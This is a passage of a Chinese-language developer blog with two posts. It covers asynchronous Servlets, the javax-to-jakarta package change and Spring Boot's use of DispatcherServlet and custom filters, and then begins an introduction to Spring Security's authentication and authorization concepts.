class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/async&quot;, asyncSupported = true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AsyncServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用一个独立的线程池来处理耗时任务</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ExecutorService</span> <span class="variable">executor</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">        response.setContentType(<span class="string">&quot;text/plain;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;主线程: &quot;</span> + Thread.currentThread().getName() + <span class="string">&quot; 开始处理请求。&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 启动异步上下文</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">AsyncContext</span> <span class="variable">asyncContext</span> <span class="operator">=</span> request.startAsync();</span><br><span class="line">        <span class="comment">// 设置超时时间 (例如 10 秒)</span></span><br><span class="line">        asyncContext.setTimeout(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 将耗时任务提交到后台线程池</span></span><br><span class="line">        executor.submit(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 模拟一个耗时的I/O操作</span></span><br><span class="line">                Thread.sleep(<span class="number">3000</span>); </span><br><span class="line"></span><br><span class="line">                <span class="comment">// 从 AsyncContext 获取响应对象</span></span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">asyncOut</span> <span class="operator">=</span> asyncContext.getResponse().getWriter();</span><br><span class="line">                asyncOut.println(<span class="string">&quot;后台线程: &quot;</span> + Thread.currentThread().getName() + <span class="string">&quot; 完成了耗时任务。&quot;</span>);</span><br><span class="line">                asyncOut.flush();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">// 3. 任务完成，必须调用 complete()</span></span><br><span class="line">                asyncContext.complete();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        out.println(<span class="string">&quot;主线程: &quot;</span> + Thread.currentThread().getName() + <span class="string">&quot; 已释放，可以去处理其他请求了。&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        executor.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="3-3-应用场景"><a href="#3-3-应用场景" class="headerlink" title="3.3 应用场景"></a>3.3 应用场景</h3><p>异步 Servlet 主要适用于<strong>I&#x2F;O密集型</strong>而非 CPU 密集型的场景。</p>
<ul>
<li><strong>调用外部 Web Service 或微服务:</strong><br>当你的应用需要调用另一个系统的 REST API 或 SOAP 服务，而对方响应较慢时，这是异步 Servlet 的完美应用场景。</li>
<li><strong>复杂的数据库操作或报表生成:</strong><br>执行需要长时间运行的数据库查询、数据聚合或生成大型报表时，可以使用异步处理，避免阻塞 Web 服务器。</li>
<li><strong>消息队列 (Message Queue) 的发布&#x2F;订阅:</strong><br>向消息中间件（如 RabbitMQ, Kafka）发送消息后，需要等待一个异步的回调或从另一个队列接收响应。</li>
<li><strong>实现长轮询 (Long Polling &#x2F; Comet):</strong><br>这是构建实时 Web 应用（如在线聊天、股票行情推送、实时通知）的一种技术。客户端发起一个请求，服务器端如果没有新数据，就<strong>挂起</strong>这个连接（通过启动异步上下文并释放线程），直到有新数据到达时，才通过 <code>AsyncContext</code> 将数据写回并 <code>complete()</code> 响应。这可以极大地节省服务器资源，是 WebSocket 出现之前的主流实时技术。</li>
<li><strong>作为API网关或代理:</strong><br>一个 Servlet 需要从多个后端服务拉取数据，然后聚合成一个响应返回。它可以异步地并行调用这些后端服务，从而缩短整体响应时间。</li>
</ul>
<hr>
<h2 id="4-Servlet-规范演进"><a href="#4-Servlet-规范演进" class="headerlink" title="4. Servlet 规范演进"></a>4. Servlet 规范演进</h2><h3 id="4-1-从-javax-servlet-Java-EE-到-jakarta-servlet-Jakarta-EE-的变迁"><a href="#4-1-从-javax-servlet-Java-EE-到-jakarta-servlet-Jakarta-EE-的变迁" class="headerlink" title="4.1 从 javax.servlet.* (Java EE) 到 jakarta.servlet.* (Jakarta EE) 的变迁"></a>4.1 从 <code>javax.servlet.*</code> (Java EE) 到 <code>jakarta.servlet.*</code> (Jakarta EE) 的变迁</h3><p>这是一个对 Java 生态系统产生深远影响的重大变化，主要是由于<strong>项目所有权的变更</strong>。</p>
<p><strong>背景：</strong></p>
<ul>
<li><strong>Java EE (Java Platform, Enterprise Edition)</strong> 最初由 Sun Microsystems 开发，后来由 <strong>Oracle</strong> 掌管。所有相关的 API 都位于 <code>javax.*</code> 包名下（<code>x</code> 代表 “extension”）。</li>
<li>2017年，Oracle 决定将 Java EE 移交给一个开源组织——<strong>Eclipse 基金会 (Eclipse Foundation)</strong> 来管理，以促进其更快的发展和社区参与。</li>
<li>项目被重新命名为 <strong>Jakarta EE</strong>。</li>
<li>由于 Oracle 拥有 <code>javax</code> 的商标权，Eclipse 基金会不能在新的 Jakarta EE 规范中继续使用这个包名来发布新版本。</li>
</ul>
<p><strong>核心变化：</strong></p>
<p>为了解决商标问题，Jakarta EE 社区决定进行一次“大爆炸”式的变更：从 <strong>Jakarta EE 9</strong> 版本开始，所有 API 的顶级包名从 <code>javax</code> 更改为 <code>jakarta</code>。</p>
<p>这对 Servlet API 意味着：</p>
<ul>
<li><p><strong>旧版本 (Servlet 4.0 及更早, 属于 Java EE 8 及更早):</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>新版本 (Servlet 5.0 及更高, 属于 Jakarta EE 9 及更高):</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>对开发者的影响：</strong></p>
<p>这是一个<strong>破坏性变更</strong>。当项目从基于 Java EE 8 的服务器（如 Tomcat 9）迁移到基于 Jakarta EE 9+ 的服务器（如 Tomcat 10+）时，开发者必须：</p>
<ol>
<li><strong>更新代码</strong>中的所有 <code>import</code> 语句。</li>
<li><strong>更新项目构建工具</strong>（如 Maven, Gradle）中的依赖坐标，从 <code>javax.servlet:javax.servlet-api</code> 更改为 <code>jakarta.servlet:jakarta.servlet-api</code>。</li>
</ol>
<hr>
<h2 id="5-与Spring的关系"><a href="#5-与Spring的关系" class="headerlink" title="5. 与Spring的关系"></a>5. 与Spring的关系</h2><p>现代 Spring Boot 与 Servlet 的合作模式可以总结为：<strong>Spring Boot 在 Servlet API 的基础上，构建了一个高度自动化、约定优于配置的开发框架。它为你管理了所有繁琐的底层 Servlet 配置，让你能专注于业务逻辑。</strong></p>
<h3 id="5-1-容器的自动化管理-The-Car-Factory"><a href="#5-1-容器的自动化管理-The-Car-Factory" class="headerlink" title="5.1 容器的自动化管理 (The Car Factory)"></a>5.1 容器的自动化管理 (The Car Factory)</h3><p><strong>传统方式:</strong></p>
<p>在没有 Spring Boot 的时代，你需要：</p>
<ol>
<li>编写一个 <code>Servlet</code> 类。</li>
<li>在 <code>web.xml</code> 文件中手动配置这个 <code>Servlet</code>，包括它的类路径、URL 映射 (<code>&lt;servlet-mapping&gt;</code>)、加载顺序 (<code>&lt;load-on-startup&gt;</code>) 等。</li>
<li>将你的应用打包成一个 <code>.war</code> 文件。</li>
<li>手动将这个 <code>.war</code> 文件部署到一个外部的 Servlet 容器（如 Tomcat, Jetty）中。</li>
</ol>
<p><strong>Spring Boot 方式 :</strong></p>
<p>Spring Boot 彻底改变了这一点：</p>
<ul>
<li><strong>内嵌 Servlet 容器</strong>：你不再需要外部的 Tomcat。当你引入 <code>spring-boot-starter-web</code> 依赖时，Spring Boot 会默认将 Tomcat（或 Jetty&#x2F;Undertow）作为<strong>一个库</strong>直接嵌入到你的应用中。</li>
<li><strong>启动即运行</strong>：运行 <code>main</code> 方法时，Spring Boot 会自动启动这个内嵌的 Tomcat 服务器，并把你的应用部署进去。没有了 <code>.war</code> 包和外部部署的繁琐步骤，开发和部署变得极其简单。</li>
</ul>
<hr>
<h3 id="5-2-请求的核心分发者：DispatcherServlet"><a href="#5-2-请求的核心分发者：DispatcherServlet" class="headerlink" title="5.2 请求的核心分发者：DispatcherServlet"></a>5.2 请求的核心分发者：<code>DispatcherServlet</code></h3><p>这是 Spring 与 Servlet 合作的<strong>最核心</strong>的组件。</p>
<p><strong>传统方式：</strong></p>
<p>你可能会为不同的功能编写多个 <code>Servlet</code>，比如 <code>LoginServlet</code>, <code>OrderServlet</code> 等，并在 <code>web.xml</code> 中为它们分别配置不同的 URL 映射。</p>
<p><strong>Spring Boot &#x2F; Spring MVC 方式：</strong></p>
<p>Spring Boot 遵循了 Spring MVC 的“前端控制器模式”（Front Controller Pattern）。它会自动为你注册一个<strong>唯一且核心</strong>的 Servlet，叫做 <code>DispatcherServlet</code>。</p>
<p>这个 <code>DispatcherServlet</code> 扮演着“交通总指挥”的角色：</p>
<ol>
<li><strong>接管所有请求</strong>：默认情况下，<code>DispatcherServlet</code> 会注册到应用的根路径 (<code>/</code>)，意味着几乎所有的 Web 请求都会先到达它这里。</li>
<li><strong>智能路由</strong>：<code>DispatcherServlet</code> 接收到请求后，不会自己处理业务逻辑。它会查询内部的 <strong><code>HandlerMapping</code></strong>（处理器映射），根据请求的 URL、HTTP 方法等信息，找到应该由哪个 <code>@Controller</code> 里的哪个方法来处理。</li>
<li><strong>分发执行</strong>：找到对应的处理方法（比如一个被 <code>@GetMapping(&quot;/users/{id}&quot;)</code> 注解的方法）后，<code>DispatcherServlet</code> 会调用它，并将处理结果（模型和视图，或 JSON 数据）返回给客户端。</li>
</ol>
<hr>
<h3 id="5-3-一个典型请求的生命周期"><a href="#5-3-一个典型请求的生命周期" class="headerlink" title="5.3 一个典型请求的生命周期"></a>5.3 一个典型请求的生命周期</h3><p>让我们看看一个请求在 Spring Boot 应用中是如何流转的：</p>
<pre><code class="highlight mermaid">sequenceDiagram
    title Spring Boot 请求处理流程

    participant Client as 客户端
    participant Tomcat as 内嵌 Tomcat
    participant FilterChain as Servlet 过滤器链
    participant DS as DispatcherServlet
    participant HM as HandlerMapping
    participant Controller as UserController
    participant HMC as HttpMessageConverter

    %% 1. 客户端发起请求
    Client-&gt;&gt;Tomcat: 1. 发送 HTTP 请求 (GET /api/users/123)

    %% 2 &amp; 3. Tomcat 接收并传递给过滤器链
    Tomcat-&gt;&gt;FilterChain: 2 &amp; 3. 传递请求给过滤器链
    note over FilterChain: 执行如 CharacterEncodingFilter, SecurityFilter 等

    %% 4. 请求到达 DispatcherServlet
    FilterChain-&gt;&gt;DS: 4. 请求穿过过滤器，到达 DispatcherServlet

    %% 5 &amp; 6. DispatcherServlet 查询并找到 Handler
    DS-&gt;&gt;HM: 5. 查询 HandlerMapping
    HM--&gt;&gt;DS: 6. 找到匹配的 Handler (UserController.getUserById)

    %% 7. DispatcherServlet 调用 Controller 方法
    DS-&gt;&gt;Controller: 7. 调用 getUserById(123)

    %% 8. Controller 处理并返回数据对象
    activate Controller
    note over Controller: 执行业务逻辑 (如查询数据库)
    Controller--&gt;&gt;DS: 8. 返回 User 对象
    deactivate Controller

    %% 9. DispatcherServlet 序列化对象
    DS-&gt;&gt;HMC: 9. 请求 HttpMessageConverter (Jackson) 序列化
    HMC--&gt;&gt;DS: 返回 JSON 字符串: &#123;&quot;id&quot;:123, &quot;name&quot;:&quot;...&quot;&#125;

    %% 10 &amp; 11. 响应反向穿过过滤器链
    DS-&gt;&gt;FilterChain: 10 &amp; 11. 将 JSON 响应反向传递给过滤器链
    note over FilterChain: 过滤器可对响应进行处理

    %% 12. Tomcat 将最终响应发送回客户端
    FilterChain-&gt;&gt;Tomcat: 响应穿过过滤器
    Tomcat--&gt;&gt;Client: 12. 返回最终 HTTP 响应 (200 OK + JSON Body)</code></pre>



<ol>
<li><strong>客户端</strong> 发送一个 HTTP 请求，例如 <code>GET /api/users/123</code>。</li>
<li><strong>内嵌的 Servlet 容器 (Tomcat)</strong> 接收到这个网络请求。</li>
<li>Tomcat 将请求传递给 Spring Boot 自动配置的 <strong>Servlet 过滤器链 (Filter Chain)</strong>，例如处理字符编码的 <code>CharacterEncodingFilter</code>、处理安全的 Spring Security 过滤器等。</li>
<li>请求穿过过滤器链，最终到达核心的 <strong><code>DispatcherServlet</code></strong>。</li>
<li><code>DispatcherServlet</code> 根据 <code>/api/users/123</code> 这个路径，查询 <code>HandlerMapping</code>。</li>
<li><code>HandlerMapping</code> 匹配到你编写的 <code>UserController</code> 中的 <code>getUserById(@PathVariable Long id)</code> 方法。</li>
<li><code>DispatcherServlet</code> 调用 <code>UserController</code> 的方法，并将路径中的 <code>123</code> 作为参数传入。</li>
<li>你的方法执行业务逻辑，返回一个 <code>User</code> 对象。</li>
<li>由于你的 <code>UserController</code> 通常被 <code>@RestController</code> 注解，<code>DispatcherServlet</code> 会通过 <strong><code>HttpMessageConverter</code></strong> (如 Jackson) 将 <code>User</code> 对象序列化成 JSON 字符串。</li>
<li><code>DispatcherServlet</code> 将 JSON 数据包装成一个 <code>HttpServletResponse</code>。</li>
<li>这个 Response 再反向穿过过滤器链。</li>
<li><strong>Tomcat</strong> 将最终的 HTTP 响应发送回客户端。</li>
</ol>
<p>在这个过程中，Servlet API（如 <code>HttpServletRequest</code>, <code>HttpServletResponse</code>, <code>Filter</code>）是这一切的<strong>底层基础</strong>，而 Spring Boot 和 Spring MVC 在其上构建了<strong>高层抽象</strong>（<code>@Controller</code>, <code>@GetMapping</code>, <code>@RequestBody</code> 等）。</p>
<hr>
<h3 id="5-4-直接与-Servlet-API-交互"><a href="#5-4-直接与-Servlet-API-交互" class="headerlink" title="5.4 直接与 Servlet API 交互"></a>5.4 直接与 Servlet API 交互</h3><p>虽然 Spring Boot 自动化了绝大部分工作，但它<strong>从未阻止</strong>你使用原生的 Servlet API。当你需要进行一些非常底层的、自定义的操作时，Spring Boot 提供了优雅的方式来实现。</p>
<h4 id="方式一：在-Controller-方法中直接注入"><a href="#方式一：在-Controller-方法中直接注入" class="headerlink" title="方式一：在 Controller 方法中直接注入"></a>方式一：在 Controller 方法中直接注入</h4><p>你可以直接在你的 Controller 方法参数中声明 <code>HttpServletRequest</code> 或 <code>HttpServletResponse</code>，Spring 会自动将它们注入进来。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/some/path&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleRequest</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">userAgent</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;User-Agent&quot;</span>);</span><br><span class="line">        <span class="comment">// 手动操作 response</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;User-Agent is: &quot;</span> + userAgent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="方式二：注册自定义的-Filter-Servlet-Listener"><a href="#方式二：注册自定义的-Filter-Servlet-Listener" class="headerlink" title="方式二：注册自定义的 Filter, Servlet, Listener"></a>方式二：注册自定义的 <code>Filter</code>, <code>Servlet</code>, <code>Listener</code></h4><p>如果你想添加自定义的过滤器，不需要 <code>web.xml</code>，只需要将它们声明为 Spring 的 <code>@Bean</code> 即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册一个自定义的 Filter</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> FilterRegistrationBean&lt;MyCustomFilter&gt; <span class="title function_">customFilter</span><span class="params">()</span> &#123;</span><br><span class="line">        FilterRegistrationBean&lt;MyCustomFilter&gt; registrationBean = <span class="keyword">new</span> <span class="title class_">FilterRegistrationBean</span>&lt;&gt;();</span><br><span class="line">        </span><br><span class="line">        registrationBean.setFilter(<span class="keyword">new</span> <span class="title class_">MyCustomFilter</span>());</span><br><span class="line">        registrationBean.addUrlPatterns(<span class="string">&quot;/api/*&quot;</span>); <span class="comment">// 只对 /api/* 路径下的请求生效</span></span><br><span class="line">        registrationBean.setOrder(<span class="number">1</span>); <span class="comment">// 设置过滤器的顺序</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> registrationBean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义的 Filter 实现</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyCustomFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> </span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        System.out.println(<span class="string">&quot;Request processing started...&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        chain.doFilter(request, response); <span class="comment">// 让请求继续向下传递</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">long</span> <span class="variable">duration</span> <span class="operator">=</span> System.currentTimeMillis() - startTime;</span><br><span class="line">        System.out.println(<span class="string">&quot;Request processing finished in &quot;</span> + duration + <span class="string">&quot;ms.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样的方式也适用于注册自定义的 <code>Servlet</code> (<code>ServletRegistrationBean</code>) 和 <code>Listener</code> (<code>ServletListenerRegistrationBean</code>)。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/06/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%BA%93/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6-SpringSecurity/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冉丝堂">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="冉的技术宝典">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | 冉的技术宝典">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/10/06/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%BA%93/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6-SpringSecurity/" class="post-title-link" itemprop="url">Spring全家桶-SpringSecurity</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-10-06 15:43:07" itemprop="dateCreated datePublished" datetime="2025-10-06T15:43:07+08:00">2025-10-06</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-10-17 11:09:49" itemprop="dateModified" datetime="2025-10-17T11:09:49+08:00">2025-10-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E4%B8%8E%E7%94%9F%E6%80%81/" itemprop="url" rel="index"><span itemprop="name">开发框架与生态</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E4%B8%8E%E7%94%9F%E6%80%81/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6/" itemprop="url" rel="index"><span itemprop="name">Spring全家桶</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="五、SpringSecurity"><a href="#五、SpringSecurity" class="headerlink" title="五、SpringSecurity"></a>五、SpringSecurity</h1><h2 id="1-入门与核心概念"><a href="#1-入门与核心概念" class="headerlink" title="1. 入门与核心概念"></a>1. 入门与核心概念</h2><h3 id="1-1-为什么需要-Spring-Security？"><a href="#1-1-为什么需要-Spring-Security？" class="headerlink" title="1.1 为什么需要 Spring Security？"></a>1.1 为什么需要 Spring Security？</h3><p>在构建任何一个严肃的Web应用时，<strong>安全（Security）永远是第一道防线，而不是一个可有可无的附加功能</strong>。无论是保护用户数据，还是防止系统被恶意攻击，一个健全的安全机制都是必不可少的。</p>
<p>那么，为什么我们不自己写安全逻辑，而要选择像 Spring Security 这样重量级的框架呢？</p>
<hr>
<h4 id="1-1-1-自己实现安全控制的陷阱"><a href="#1-1-1-自己实现安全控制的陷阱" class="headerlink" title="1.1.1 自己实现安全控制的陷阱"></a>1.1.1 自己实现安全控制的陷阱</h4><p>如果我们尝试自己动手实现安全功能，通常会怎么做？</p>
<ol>
<li><strong>登录验证</strong>：在 Controller 里写一个 <code>login</code> 方法，从请求中获取用户名和密码，查询数据库，比对成功后将用户信息存入 <code>HttpSession</code>。</li>
<li><strong>访问控制</strong>：在需要保护的 Controller 方法或 Service 方法开头，写大量的 <code>if/else</code> 逻辑，从 <code>HttpSession</code> 中取出用户信息，判断其是否有权限访问。</li>
</ol>
<p>这种“手写”方式会带来一系列严重问题：</p>
<ul>
<li><strong>代码高度耦合且重复</strong>：安全逻辑（权限判断）和业务逻辑混杂在一起，遍布在项目的各个角落。一旦权限规则变更，你需要修改大量代码，极难维护。</li>
<li><strong>容易出错且不安全</strong>：安全是一个非常专业的领域。“自己发明”的加密算法、会话管理机制很可能存在未知的漏洞。例如，密码没有加盐（Salt）、容易受到时序攻击（Timing Attacks）、没有防护会话固定（Session Fixation）等。一个微小的疏忽就可能导致整个系统被攻破。</li>
<li><strong>功能不全面</strong>：一个现代Web应用需要的远不止是登录和简单的权限判断。你还需要考虑：<ul>
<li>CSRF（跨站请求伪造）防护</li>
<li>CORS（跨域资源共享）配置</li>
<li>防止暴力破解（如登录失败次数限制）</li>
<li>“记住我”功能  </li>
<li>与其他认证体系（如OAuth2, LDAP）集成</li>
<li>…</li>
</ul>
</li>
</ul>
<p><strong>结论：</strong> “不要重复造轮子”，尤其不要造“安全的轮子”。自己实现安全控制费时费力、极易出错，且难以维护。</p>
<hr>
<h4 id="1-1-2-Spring-Security-解决的核心问题"><a href="#1-1-2-Spring-Security-解决的核心问题" class="headerlink" title="1.1.2 Spring Security 解决的核心问题"></a>1.1.2 Spring Security 解决的核心问题</h4><p>Spring Security 作为一个专业、强大的安全框架，解决了两个最核心、最基础的安全问题：</p>
<ol>
<li><strong>认证 (Authentication) - “你是谁？”</strong><ul>
<li>这是验证用户身份的过程。用户提供一些凭证（Credentials），如用户名和密码、手机验证码、指纹、或是一个Token，系统通过验证这些凭证来确认用户的真实身份。</li>
</ul>
</li>
<li><strong>授权 (Authorization) - “你能做什么？”</strong><ul>
<li>这发生在认证成功之后。系统根据已认证用户的身份（通常是其拥有的角色或权限），来决定他是否有权访问某个资源（如一个URL、一个按钮、一个方法）。</li>
</ul>
</li>
</ol>
<p>Spring Security 提供了一套标准的、可扩展的机制来优雅地处理认证和授权。</p>
<hr>
<h4 id="1-1-3-Spring-Security核心优势"><a href="#1-1-3-Spring-Security核心优势" class="headerlink" title="1.1.3 Spring Security核心优势"></a>1.1.3 Spring Security核心优势</h4><ol>
<li><strong>与 Spring 生态无缝集成</strong><ul>
<li>作为 Spring 家族的一员，它能与 Spring Boot, Spring MVC, Spring Data 等项目完美整合。通过简单的依赖引入和自动化配置，你就能快速拥有一个基础的安全环境。</li>
</ul>
</li>
<li><strong>声明式安全 (Declarative Security)</strong><ul>
<li>你不再需要在业务代码中手动编写 <code>if-else</code> 来判断权限。Spring Security 允许你通过<strong>配置</strong>和<strong>注解</strong>来声明安全规则。</li>
<li><strong>例如</strong>：<ul>
<li><strong>配置层面</strong>：<code>http.authorizeHttpRequests(auth -&gt; auth.requestMatchers(&quot;/admin/**&quot;).hasRole(&quot;ADMIN&quot;))</code>，一行代码保护所有 <code>/admin/</code> 开头的 URL。</li>
<li><strong>方法层面</strong>：在方法上加一个注解 <code>@PreAuthorize(&quot;hasRole(&#39;ADMIN&#39;)&quot;)</code>，就完成了对该方法的权限控制。</li>
</ul>
</li>
<li>这种方式让安全逻辑与业务逻辑彻底解耦，代码更清晰，维护性更高。</li>
</ul>
</li>
<li><strong>全面且强大的功能</strong><ul>
<li><strong>全面的认证支持</strong>：支持基于表单、HTTP Basic、LDAP、OAuth2、OpenID Connect、SAML 等多种认证方式。</li>
<li><strong>精细的授权控制</strong>：支持基于URL的授权、基于方法的授权，并且可以使用强大的SpEL表达式进行复杂的动态授权。</li>
<li><strong>内置常见Web攻击防护</strong>：默认开启并强制执行 CSRF 防护、会话固定攻击防护、点击劫持（Clickjacking）防护等，大大提升了应用的安全性。</li>
</ul>
</li>
<li><strong>高度可扩展</strong><ul>
<li>Spring Security 的设计遵循“面向接口编程”和“责任链模式”。几乎每一个核心组件（如 <code>UserDetailsService</code>, <code>PasswordEncoder</code>, <code>AuthenticationProvider</code>）都是可替换、可扩展的。这意味着你可以轻松地将其定制为你需要的任何认证授权模式（如短信验证码登录、扫码登录等）。</li>
